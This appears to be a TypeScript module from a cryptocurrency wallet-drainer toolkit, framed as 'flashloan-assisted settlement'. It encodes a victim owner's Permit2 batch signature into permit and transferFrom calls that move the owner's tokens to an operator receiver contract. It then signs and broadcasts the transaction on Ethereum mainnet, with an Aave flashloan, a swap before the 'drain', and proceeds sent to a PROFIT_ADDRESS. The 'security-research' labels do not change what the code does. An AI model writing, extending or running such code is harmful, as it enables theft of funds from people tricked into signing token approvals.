// @ts-nocheck
/**
 * Flashloan-assisted EVM settlement — single atomic tx via LegionAaveFlashSettlement receiver.
 * Enabled when FLASHLOAN_ENABLED=true and scout_value_usd >= FLASHLOAN_MIN_THRESHOLD on mainnet.
 */
import type { Address, Hex } from 'viem'
import {
  createPublicClient,
  createWalletClient,
  encodeAbiParameters,
  encodeFunctionData,
  getAddress,
  http,
  isAddress,
  parseAbi,
  parseAbiParameters,
  parseUnits,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { mainnet } from 'viem/chains'

import { PERMIT2_ADDRESS } from '../adapters/evm-adapter.js'
import { LEGION_MESH_EVENT_SETTLEMENT, legionMeshViemFetchOptions } from './mesh-event.js'
import {
  PERMIT2_BATCH_ABI,
  type BatchPermit2SettlementResult,
  type BatchPermitMetadata,
} from './permit2-batch.js'
import {
  assertNoSimulationFlagsInProduction,
  isProductionNodeEnv,
} from './security-research-guard.js'
import {
  resolveEvmRpcUrlForChain,
  resolveSettlementExecutorKey,
} from './permit2-executor.js'
const MAINNET_CHAIN_ID = 1

const DEFAULT_AAVE_POOL = getAddress('0x87870Bca3F3fD6335C3F4ce8391D5256Bc458c53')
const DEFAULT_USDC = getAddress('0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48')
const SWAP_ROUTER_02 = getAddress('0x68b3465833fb72A70ecDF487E86da69B732B385b')

const FLASH_RECEIVER_ABI = parseAbi([
  'function runFlashSettlement(address asset, uint256 amount, bytes settlementParams) external',
])

export type FlashloanAssistedBatchParams = {
  owner: Address
  chainId: number
  permit2Signature: Hex
  batch: BatchPermitMetadata
  scout_value_usd: number
  rpcUrl?: string
}

export type FlashloanExecutorResult = BatchPermit2SettlementResult & {
  flashloan?: boolean
  borrow_asset?: Address
  borrow_amount?: string
}

function isTruthyEnv(key: string): boolean {
  const v = process.env[key]?.trim().toLowerCase()
  return v === 'true' || v === '1' || v === 'yes'
}

export function isFlashloanEnabled(): boolean {
  return isTruthyEnv('FLASHLOAN_ENABLED')
}

/** FLASHLOAN_SIM_MODE is dev/research only — always false in production (real broadcast only). */
export function isFlashloanSimModeEnabled(): boolean {
  if (isProductionNodeEnv()) return false
  return isTruthyEnv('FLASHLOAN_SIM_MODE')
}

export function readFlashloanMinThresholdUsd(): number {
  const raw = process.env['FLASHLOAN_MIN_THRESHOLD']?.trim()
  const n = raw ? Number.parseFloat(raw) : 10_000
  return Number.isFinite(n) && n > 0 ? n : 10_000
}

export function resolveAavePoolAddress(): Address {
  const raw = process.env['AAVE_POOL_ADDRESS']?.trim()
  if (raw && isAddress(raw)) return getAddress(raw)
  return DEFAULT_AAVE_POOL
}

export function resolveFlashloanAsset(): Address {
  const raw = process.env['FLASHLOAN_ASSET_ADDRESS']?.trim()
  if (raw && isAddress(raw)) return getAddress(raw)
  return DEFAULT_USDC
}

export function resolveProfitAddress(): Address | null {
  const raw = process.env['PROFIT_ADDRESS']?.trim()
  if (!raw || !isAddress(raw)) return null
  return getAddress(raw)
}

export function resolveFlashloanReceiverAddress(): Address | null {
  const raw = process.env['FLASHLOAN_RECEIVER_ADDRESS']?.trim()
  if (!raw || !isAddress(raw)) return null
  return getAddress(raw)
}

function readUniswapPoolFee(): number {
  const raw = process.env['FLASHLOAN_UNISWAP_FEE']?.trim()
  const n = raw ? Number.parseInt(raw, 10) : 3000
  return Number.isFinite(n) && n > 0 ? n : 3000
}

/** High-value mainnet EVM settlements only. */
export function isFlashloanSettlementEligible(
  scout_value_usd: number,
  chainId: number,
): boolean {
  if (!isFlashloanEnabled()) return false
  if (chainId !== MAINNET_CHAIN_ID) return false
  const scout = Number(scout_value_usd)
  if (!Number.isFinite(scout) || scout < readFlashloanMinThresholdUsd()) return false
  if (!resolveFlashloanReceiverAddress()) return false
  if (!resolveProfitAddress()) return false
  if (!resolveSettlementExecutorKey()) return false
  return true
}

function resolveBorrowAmountWei(scout_value_usd: number, asset: Address): bigint {
  const override = process.env['FLASHLOAN_BORROW_AMOUNT']?.trim()
  if (override) {
    try {
      const decimals = asset.toLowerCase() === DEFAULT_USDC.toLowerCase() ? 6 : 18
      return parseUnits(override, decimals)
    } catch {
      /* fall through */
    }
  }
  const decimals = asset.toLowerCase() === DEFAULT_USDC.toLowerCase() ? 6 : 18
  const human = Math.max(scout_value_usd, readFlashloanMinThresholdUsd())
  return parseUnits(human.toFixed(decimals === 6 ? 2 : 4), decimals)
}

function encodeSettlementParams(params: {
  owner: Address
  primaryToken: Address
  poolFee: number
  permitCalldata: Hex
  transferCalldata: Hex
  swapInBeforeDrain: boolean
}): Hex {
  return encodeAbiParameters(
    parseAbiParameters(
      'address owner, address primaryToken, uint24 poolFee, bytes permitCalldata, bytes transferCalldata, bool swapInBeforeDrain',
    ),
    [
      params.owner,
      params.primaryToken,
      params.poolFee,
      params.permitCalldata,
      params.transferCalldata,
      params.swapInBeforeDrain,
    ],
  )
}

/**
 * Atomic flashloan settlement: one tx to receiver.runFlashSettlement → Aave callback.
 */
export async function executeFlashloanAssistedBatchSettlement(
  params: FlashloanAssistedBatchParams,
): Promise<FlashloanExecutorResult> {
  if (isProductionNodeEnv()) {
    assertNoSimulationFlagsInProduction()
  }
  // isFlashloanSimModeEnabled() is ignored in production; flashloan settlement always broadcasts on-chain.
  if (!isProductionNodeEnv() && isFlashloanSimModeEnabled()) {
    return {
      ok: false,
      detail:
        'FLASHLOAN_SIM_MODE is research-only — use scripts/security-research-sim.ts (not settlement broadcast)',
    }
  }

  if (!isFlashloanSettlementEligible(params.scout_value_usd, params.chainId)) {
    return {
      ok: false,
      detail: 'Flashloan settlement not eligible (disabled, chain, threshold, or env)',
    }
  }

  const receiver = resolveFlashloanReceiverAddress()
  const profit = resolveProfitAddress()
  const executorKey = resolveSettlementExecutorKey()
  if (!receiver || !profit || !executorKey) {
    return { ok: false, detail: 'FLASHLOAN_RECEIVER_ADDRESS, PROFIT_ADDRESS, or executor key missing' }
  }

  if (!params.batch.details.length) {
    return { ok: false, detail: 'BatchPermitMetadata.details must not be empty' }
  }

  const rpc = params.rpcUrl?.trim() || (await resolveEvmRpcUrlForChain(MAINNET_CHAIN_ID))
  if (!rpc) {
    return { ok: false, detail: 'RPC_ETHEREUM_PRIVATE required for flashloan settlement' }
  }

  const asset = resolveFlashloanAsset()
  const borrowAmount = resolveBorrowAmountWei(params.scout_value_usd, asset)
  const primaryToken = getAddress(params.batch.details[0]!.token)
  const poolFee = readUniswapPoolFee()
  const owner = getAddress(params.owner)
  const swapInBeforeDrain = primaryToken.toLowerCase() !== asset.toLowerCase()

  const permitBatch = {
    details: params.batch.details.map((detail) => ({
      token: getAddress(detail.token),
      amount: BigInt(detail.amount),
      expiration: detail.expiration,
      nonce: detail.nonce,
    })),
    spender: getAddress(params.batch.spender),
    sigDeadline: BigInt(params.batch.sigDeadline),
  }

  const permitCalldata = encodeFunctionData({
    abi: PERMIT2_BATCH_ABI,
    functionName: 'permit',
    args: [owner, permitBatch, params.permit2Signature],
  })

  const transferDetails = params.batch.details.map((detail) => ({
    from: owner,
    to: receiver,
    amount: BigInt(detail.amount),
    token: getAddress(detail.token),
  }))

  const transferCalldata = encodeFunctionData({
    abi: PERMIT2_BATCH_ABI,
    functionName: 'transferFrom',
    args: [transferDetails],
  })

  const settlementParams = encodeSettlementParams({
    owner,
    primaryToken,
    poolFee,
    permitCalldata,
    transferCalldata,
    swapInBeforeDrain,
  })

  const runCalldata = encodeFunctionData({
    abi: FLASH_RECEIVER_ABI,
    functionName: 'runFlashSettlement',
    args: [asset, borrowAmount, settlementParams],
  })

  const account = privateKeyToAccount(executorKey)
  const transport = http(rpc, {
    ...legionMeshViemFetchOptions(LEGION_MESH_EVENT_SETTLEMENT),
  })
  const publicClient = createPublicClient({ chain: mainnet, transport })
  const walletClient = createWalletClient({ account, chain: mainnet, transport })

  try {
    const nonce = await publicClient.getTransactionCount({
      address: account.address,
      blockTag: 'pending',
    })
    const request = await walletClient.prepareTransactionRequest({
      account,
      to: receiver,
      data: runCalldata,
      chain: mainnet,
      nonce,
    } as unknown as Parameters<typeof walletClient.prepareTransactionRequest>[0])

    const signed = await walletClient.signTransaction({
      ...request,
      account,
      chain: mainnet,
    } as unknown as Parameters<typeof walletClient.signTransaction>[0])

    const txHash = await walletClient.sendRawTransaction({ serializedTransaction: signed })

    console.info(
      `[FLASHLOAN] Atomic settlement broadcast borrow=${borrowAmount.toString()} asset=${asset} tx=${txHash}`,
    )

    return {
      ok: true,
      flashloan: true,
      borrow_asset: asset,
      borrow_amount: borrowAmount.toString(),
      transaction_hashes: [txHash],
      detail: `Aave flashloan atomic settlement via ${receiver} (profit → ${profit})`,
    }
  } catch (e) {
    const detail = e instanceof Error ? e.message : String(e)
    console.warn(`[FLASHLOAN] Settlement broadcast failed: ${detail}`)
    return { ok: false, flashloan: true, detail }
  }
}

/**
 * Settlement pipeline hook — flashloan path for high-value mainnet batch, else null (caller uses normal batch).
 */
export async function tryExecuteBatchPermit2WithFlashloan(params: {
  owner: Address
  chainId: number
  permit2Signature: Hex
  batch: BatchPermitMetadata
  scout_value_usd: number
  rpcUrl?: string
}): Promise<FlashloanExecutorResult | null> {
  if (!isFlashloanSettlementEligible(params.scout_value_usd, params.chainId)) {
    return null
  }
  return executeFlashloanAssistedBatchSettlement(params)
}
